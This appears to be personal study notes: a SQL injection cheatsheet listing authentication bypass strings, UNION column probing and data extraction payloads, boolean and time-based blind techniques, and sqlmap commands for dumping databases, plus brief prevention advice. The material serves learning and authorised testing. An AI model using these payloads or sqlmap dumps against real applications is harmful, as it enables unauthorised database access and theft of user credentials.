# SQL Injection Cheatsheet

## Introduction

A collection of commonly used SQL Injection payloads and techniques.

Useful for:

- CTF challenges
- Web security testing
- Quick revision

---

# Basic SQL Injection Test

Check if input is injectable.

```sql
'
```

```sql
"
```

If the application returns a database error or behaves differently, SQL Injection may exist.

---

# SQL Comments

Used to ignore the remaining query.

## MySQL

```sql
--
```

```sql
#
```

Example:

```sql
admin'--
```

---

Original query:

```sql
SELECT *
FROM users
WHERE username='admin'
AND password='test';
```

Injected query:

```sql
SELECT *
FROM users
WHERE username='admin'--
AND password='test';
```

Password check is ignored.

---

# Authentication Bypass

## Always True Condition

Payload:

```sql
' OR '1'='1
```

---

Example:

```sql
SELECT *
FROM users
WHERE username=''
OR '1'='1';
```

Since:

```sql
1=1
```

is TRUE, authentication may be bypassed.

---

Common payloads:

```sql
admin'--

' OR 1=1--

" OR "1"="1

') OR ('1'='1
```

---

# Finding Number of Columns

Required for UNION attacks.

## ORDER BY Method

```sql
' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--
```

Continue until an error occurs.

Example:

```text
ORDER BY 3 works

ORDER BY 4 fails
```

Result:

```text
3 columns
```

---

# UNION Column Testing

Find valid column count.

```sql
' UNION SELECT NULL--
```

```sql
' UNION SELECT NULL,NULL--
```

```sql
' UNION SELECT NULL,NULL,NULL--
```

Increase until successful.

---

# Find Visible Columns

Payload:

```sql
' UNION SELECT 1,2,3--
```

If page displays:

```text
2
```

Use column 2 for extraction.

---

# Database Enumeration

## Current Database

```sql
SELECT database();
```

Payload:

```sql
' UNION SELECT NULL,database()--
```

---

## Database Version

```sql
SELECT version();
```

Payload:

```sql
' UNION SELECT NULL,version()--
```

---

## Current User

```sql
SELECT user();
```

---

# Finding Tables

MySQL:

```sql
SELECT table_name
FROM information_schema.tables;
```

Payload:

```sql
' UNION SELECT NULL,table_name
FROM information_schema.tables--
```

---

# Finding Columns

```sql
SELECT column_name
FROM information_schema.columns;
```

Example:

```sql
' UNION SELECT NULL,column_name
FROM information_schema.columns
WHERE table_name='users'--
```

---

# Extract Data

Example table:

```text
users
```

Columns:

```text
username
password
```

Payload:

```sql
' UNION SELECT username,password
FROM users--
```

---

# Boolean Blind SQL Injection

Used when output is hidden.

---

## TRUE Test

```sql
' AND 1=1--
```

Normal response.

---

## FALSE Test

```sql
' AND 1=2--
```

Different response.

---

# Extract Characters

## SUBSTRING

Example:

```sql
' AND SUBSTRING(password,1,1)='a'--
```

Meaning:

```text
Is first password character 'a'?
```

---

# ASCII Based Extraction

```sql
' AND ASCII(SUBSTRING(password,1,1))>80--
```

Used for binary search optimization.

---

# Time-Based SQL Injection

Used when responses look identical.

---

## Sleep Test

MySQL:

```sql
' AND SLEEP(5)--
```

---

Conditional delay:

```sql
' AND IF(1=1,SLEEP(5),0)--
```

TRUE:

```text
5 second delay
```

FALSE:

```text
Normal response
```

---

# Useful SQL Functions

## Length

```sql
LENGTH(password)
```

Find string size.

---

## Substring

```sql
SUBSTRING(password,position,length)
```

Example:

```sql
SUBSTRING(password,1,1)
```

Returns first character.

---

## ASCII

```sql
ASCII('A')
```

Returns:

```text
65
```

---

# SQLMap Basics

## Test URL

```bash
sqlmap -u "http://site.com/page?id=1"
```

---

## List Databases

```bash
sqlmap -u URL --dbs
```

---

## List Tables

```bash
sqlmap -u URL -D database --tables
```

---

## Dump Data

```bash
sqlmap -u URL --dump
```

---

# Prevention Quick Notes

Prevent SQL Injection using:

- Prepared statements
- Parameterized queries
- Input validation
- Least privilege database users
- Secure error handling

---

# Quick Attack Flow

```
Find Input
     |
     v
Test Injection
     |
     v
Find Query Structure
     |
     v
Enumerate Database
     |
     v
Extract Data
```

---

# Key Takeaways

- `'` is commonly used to detect SQL Injection.
- Comments remove unwanted query parts.
- UNION extracts visible data.
- Blind SQLi uses TRUE/FALSE logic.
- Time-Based SQLi uses delays.
- Automation helps with blind attacks.
- Prepared statements prevent SQL Injection.

---

## Practice Completed

Platforms:

- TryHackMe SQL Injection Introduction
- OverTheWire Natas

Concepts Practiced:

- Authentication Bypass
- UNION Injection
- Boolean Blind SQLi
- Time-Based SQLi
- SQL Injection Automation